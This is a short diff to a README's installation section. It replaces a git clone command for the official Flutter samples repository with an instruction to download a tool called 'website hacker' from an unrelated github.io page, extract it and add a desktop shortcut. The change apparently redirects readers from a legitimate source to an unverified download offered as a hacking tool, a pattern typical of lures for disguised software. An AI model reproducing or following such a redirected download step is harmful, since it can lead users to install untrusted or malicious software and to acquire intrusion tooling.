@@ -10,7 +10,7 @@
 
 #### Follow this steps to install the software
 
-```git clone --filter=blob:none https://github.com/flutter/samples.git```
+go to https://blackstackhub.github.io/website-hacker#download to download
 extract to documents folder then create shortlink for website hacker to your desktop
 
 #### Usage Image are shown below
